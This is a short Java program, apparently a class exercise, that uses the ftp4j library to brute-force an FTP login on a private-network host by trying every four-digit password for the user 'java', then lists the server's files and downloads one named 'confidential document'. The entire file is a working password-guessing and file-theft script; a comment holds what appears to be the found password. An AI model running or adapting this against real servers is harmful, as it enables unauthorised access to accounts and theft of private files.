import java.io.File;

import it.sauronsoftware.ftp4j.FTPClient;

public class BruteFocer {

	public static void main(String[] args) {
		//	2465
		FTPClient client = new FTPClient();
		String s = null;
		try {
			client.connect("192.168.50.25");
		} catch (Exception e) {
			e.printStackTrace();
		}
		for (int i = 1000; i < 10000; i++) {
			try {
				s = Integer.toString(i);
				client.login("java", s);
				break;
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		System.out.println(s);
		
		try {
			for (String a : client.listNames()) {
				System.out.println(a);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		try {
			client.download("기밀문서.txt", new File("D:\\2023_01_스마트웹\\download\\test\\해답.txt"));
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
}